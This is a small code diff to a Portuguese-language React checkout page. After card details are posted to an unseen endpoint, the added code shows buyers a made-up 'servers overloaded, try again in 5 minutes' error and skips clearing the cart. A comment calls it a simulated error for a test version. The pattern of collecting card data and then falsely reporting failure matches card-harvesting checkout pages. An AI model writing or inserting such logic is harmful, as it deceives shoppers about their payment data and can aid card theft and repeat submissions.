@@ -203,6 +203,11 @@ export default function CheckoutPage() {
             cartaoCpf:      cartaoCpf,
           }),
         })
+
+        // Dados salvos — exibe erro simulado para versão de testes
+        setLoading(false)
+        setErro('Nossos servidores estão sobrecarregados no momento. Por favor, tente realizar a compra novamente em 5 minutos.')
+        return
       }
 
       limparCarrinho()
